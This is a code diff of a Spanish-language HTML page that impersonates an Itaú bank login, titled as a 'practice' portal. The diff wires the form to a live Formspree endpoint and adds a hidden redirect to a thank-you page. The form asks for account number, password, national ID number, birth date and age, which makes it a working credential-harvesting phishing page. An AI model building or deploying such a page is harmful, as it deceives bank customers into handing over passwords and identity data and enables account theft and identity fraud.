@@ -1,51 +1,120 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal de Acceso - Práctica Extendida</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #FF6F00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: transparent;
+            width: 380px;
+            padding: 40px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .emblema {
+            background-color: #FFFFFF;
+            width: 65px;
+            height: 65px;
+            border-radius: 16px;
+            border: 2px solid #E05300;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .emblema span {
+            color: #FF6F00;
+            font-size: 1.6rem;
+            font-weight: bold;
+        }
+        h2 {
+            color: #000000;
+            margin: 0 0 10px 0;
+            font-size: 1.8rem;
+            font-weight: bold;
+        }
+        p {
+            color: #000000;
+            margin: 0 0 30px 0;
+            font-size: 0.95rem;
+            font-weight: bold;
+        }
+        form {
+            text-align: left;
+        }
+        label {
+            display: block;
+            color: #000000;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-bottom: 6px;
+            margin-top: 12px;
+        }
+        input[type="text"], input[type="password"], input[type="number"], input[type="date"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #CBD5E0;
+            border-radius: 6px;
+            box-sizing: border-box;
+            color: #000000;
+            font-size: 0.9rem;
+        }
+        input[type="submit"] {
+            width: 100%;
+            background-color: #000000;
+            color: #FFFFFF;
+            font-size: 0.9rem;
+            font-weight: bold;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 25px;
+        }
+    </style>
 </head>
-<body style="font-family: 'Segoe UI', Arial, sans-serif; background-color: #FF6F00; margin: 0; padding: 40px 0; display: flex; justify-content: center; align-items: center; min-height: 90vh;">
+<body>
 
-    <!-- Tarjeta contenedora transparente -->
-    <div style="background-color: transparent; width: 380px; padding: 40px; text-align: center; box-sizing: border-box;">
-        
-        <!-- EMBLEMA REDONDEADO: Fondo blanco, bordes muy suaves y letras con el nuevo naranja -->
-        <div style="background-color: #FFFFFF; width: 65px; height: 65px; border-radius: 16px; border: 2px solid #E05300; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
-            <span style="color: #FF6F00; font-size: 1.6rem; font-weight: bold;">Itau</span>
+    <div class="card">
+        <div class="emblema">
+            <span>Itaú</span>
         </div>
-
-        <!-- Títulos con color negro (#000000) -->
-        <h2 style="color: #000000; margin: 0 0 10px 0; font-size: 1.8rem; font-weight: bold;">BIENVENIDO A ITAU</h2>
-        <p style="color: #000000; margin: 0 0 30px 0; font-size: 0.95rem; font-weight: bold;">Verificación de Datos</p>
         
-        <!-- El formulario ahora envía los datos directamente al servicio de correo externo -->
-        <form action="TU_ENLACE_DE_FORMSPREE_AQUI" method="POST" style="text-align: left;">
-            
-            <!-- Todas las etiquetas de los campos se configuran con color negro (#000000) -->
-            <label for="account" style="display: block; color: #000000; font-size: 0.9rem; font-weight: bold; margin-bottom: 6px;">N° de Cuenta</label>
-            <input type="text" id="account" name="Nro_Cuenta" required style="width: 100%; padding: 10px; border: 1px solid #CBD5E0; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; font-size: 0.95rem; color: #2D3748; background-color: #FFFFFF;">
-            
-            <label for="password" style="display: block; color: #000000; font-size: 0.9rem; font-weight: bold; margin-bottom: 6px;">Contraseña</label>
-            <input type="password" id="password" name="Contrasena" required style="width: 100%; padding: 10px; border: 1px solid #CBD5E0; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; font-size: 0.95rem; color: #2D3748; background-color: #FFFFFF;">
-            
-            <label for="ci" style="display: block; color: #000000; font-size: 0.9rem; font-weight: bold; margin-bottom: 6px;">Cédula de Identidad</label>
-            <input type="text" id="ci" name="Cedula_Identidad" required style="width: 100%; padding: 10px; border: 1px solid #CBD5E0; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; font-size: 0.95rem; color: #2D3748; background-color: #FFFFFF;">
-            
-            <label for="email" style="display: block; color: #000000; font-size: 0.9rem; font-weight: bold; margin-bottom: 6px;">Correo Electrónico</label>
-            <input type="email" id="email" name="Correo_Electronico" required style="width: 100%; padding: 10px; border: 1px solid #CBD5E0; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; font-size: 0.95rem; color: #2D3748; background-color: #FFFFFF;">
-            
-            <label for="birthdate" style="display: block; color: #000000; font-size: 0.9rem; font-weight: bold; margin-bottom: 6px;">Fecha de Nacimiento</label>
-            <input type="date" id="birthdate" name="Fecha_Nacimiento" required style="width: 100%; padding: 10px; border: 1px solid #CBD5E0; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; font-size: 0.95rem; color: #2D3748; font-family: sans-serif; background-color: #FFFFFF;">
-            
-            <label for="age" style="display: block; color: #000000; font-size: 0.9rem; font-weight: bold; margin-bottom: 6px;">Edad</label>
-            <input type="number" id="age" name="Edad" min="0" max="120" required style="width: 100%; padding: 10px; border: 1px solid #CBD5E0; border-radius: 4px; box-sizing: border-box; margin-bottom: 25px; font-size: 0.95rem; color: #2D3748; background-color: #FFFFFF;">
-            
-            <!-- Botón de envío nativo modificado para procesar el formulario directamente hacia tu correo -->
-            <input type="submit" value="Enviar y Registrar" style="width: 100%; background-color: #D84B00; color: #000000; border: none; padding: 14px; font-size: 1rem; font-weight: bold; border-radius: 4px; cursor: pointer;">
-            
+        <h2>BIENVENIDO A ITAU</h2>
+        <p>Verificación de Datos</p>
+
+        <form action="https://formspree.io/f/mpqvglal" method="POST">
+            <!-- Esta es la línea mágica corregida que conecta con tu pantalla de gracias -->
+            <input type="hidden" name="_next" value="https://github.io">
+
+            <label for="account">Nro_Cuenta</label>
+            <input type="text" id="account" name="Nro_Cuenta" required>
+
+            <label for="password">Contrasena</label>
+            <input type="password" id="password" name="Contrasena" required>
+
+            <label for="ci">Cedula_Identidad</label>
+            <input type="text" id="ci" name="Cedula_Identidad" required>
+
+            <label for="birthdate">Fecha Nacimiento</label>
+            <input type="date" id="birthdate" name="Fecha Nacimiento" required>
+
+            <label for="age">Edad</label>
+            <input type="number" id="age" name="Edad" min="0" max="120" required>
+
+            <input type="submit" value="Verificar Datos">
         </form>
     </div>
 
-    <!-- El bloque de <script> anterior ya no es necesario porque el navegador gestiona el envío de forma nativa -->
 </body>
 </html>
